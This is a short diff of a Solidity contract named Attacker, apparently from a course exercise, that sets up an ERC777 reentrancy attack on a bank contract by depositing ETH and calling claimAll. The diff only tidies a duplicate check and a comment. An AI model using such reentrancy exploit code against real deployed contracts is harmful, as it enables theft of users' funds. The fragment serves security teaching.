@@ -37,13 +37,12 @@ contract Attacker is AccessControl, IERC777Recipient {
 	function attack(uint256 amt) payable public {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
-		require(address(bank) != address(0), "Target bank not set");
         require(msg.value == amt, "Must send exactly amt ETH");
 		
 		bank.deposit{value: amt}();
         emit Deposit(amt);
         depth = 0;
-        bank.claimAll();  // This will mint MCITR and trigger tokensReceived		
+        bank.claimAll();	
 	}
 
 	/*
